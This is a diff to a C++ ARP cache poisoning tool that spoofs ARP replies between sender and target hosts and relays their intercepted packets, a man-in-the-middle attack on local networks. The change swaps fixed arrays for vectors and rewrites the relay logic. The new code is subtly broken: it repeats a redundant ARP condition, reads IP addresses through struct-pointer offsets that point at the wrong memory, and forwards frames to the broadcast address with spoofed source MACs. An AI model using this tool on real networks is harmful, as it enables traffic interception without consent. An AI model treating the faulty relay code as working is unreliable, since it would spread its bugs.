@@ -20,6 +20,8 @@
 
 #include <pthread.h> // added
 
+#include <vector>
+
 #pragma pack(push, 1)
 struct EthArpPacket final {
 	EthHdr eth_;
@@ -212,20 +214,15 @@ int main(int argc, char* argv[]) {
 	
 	int req = (argc - 2) / 2;
 	
-	
-	uint32_t sender_ips[5000];
-	uint32_t target_ips[5000];
-	Mac sender_macs[5000];
-	Mac target_macs[5000];
+	std::vector<uint32_t> sender_ips, target_ips;
+	std::vector<Mac> sender_macs, target_macs;
+
 	
 	printf("ARP cache poisoning start... \n");
 	
 	for(int i = 0; i < req; i++) {
 		uint32_t sender = Ip(argv[2 * i + 2]);
 		uint32_t target = Ip(argv[2 * i + 3]);
-		
-		sender_ips[i] = sender;
-		target_ips[i] = target;
 		
 		Mac sender_mac;
 		Mac target_mac;
@@ -246,6 +243,13 @@ int main(int argc, char* argv[]) {
 		}
 		printf("SENDER MAC: ");
 		macprint(sender_mac);
+		
+		sender_ips.push_back(sender);
+		target_ips.push_back(target);
+		
+		sender_macs.push_back(sender_mac);
+		target_macs.push_back(target_mac);
+		
 		
 		// eon7500.tistory.com/43
 		arg t = {handle, &packet, sender_mac, target_mac, sender, target, my_mac, 10};
@@ -273,6 +277,8 @@ int main(int argc, char* argv[]) {
 		if(ntohs(packet->eth_.type_) == EthHdr::Arp) {
 			for(int i = 0; i < req; i++) {
 				if((ntohl(packet->arp_.tip_) != sender_ips[i]) && (ntohl(packet->arp_.tip_) != target_ips[i]))
+					continue;
+				if((ntohl(packet->arp_.tip_) != target_ips[i]) && (ntohl(packet->arp_.tip_) != sender_ips[i]))
 					continue;	
 				
 				arg t = {handle, packet, sender_macs[i], target_macs[i], sender_ips[i], target_ips[i], my_mac, -1};
@@ -284,13 +290,18 @@ int main(int argc, char* argv[]) {
 		}
 		else if(packet->eth_.dmac_ == my_mac){
 			for(int i = 0; i < req; i++) {
-				if((packet->eth_.smac_ == target_macs[i]) &&  (ntohl(*((uint32_t *)((uint8_t *)packet + 30))) == sender_ips[i])) {
-					packet->eth_.dmac_ = sender_macs[i];
-					packet->eth_.smac_ = my_mac;
+				if(ntohs(packet->eth_.type_) != EthHdr::Ip4)
+					continue;
+				
+				uint32_t src_addr = ntohl(*(uint32_t *)(packet + 12));
+				uint32_t dst_addr = ntohl(*(uint32_t *)(packet + 16));
+				if(src_addr == sender_ips[i] && dst_addr == target_ips[i]) {
+					packet->eth_.dmac_ = mac_ff;
+					packet->eth_.smac_ = sender_macs[i];
 				}
-				else if(packet->eth_.smac_ == sender_macs[i]) {
-					packet->eth_.dmac_ = target_macs[i];
-					packet->eth_.smac_ = my_mac;
+				else if(src_addr == target_ips[i] && dst_addr == sender_ips[i]){
+					packet->eth_.dmac_ = mac_ff;
+					packet->eth_.smac_ = target_macs[i];
 				}
 				else
 					continue;
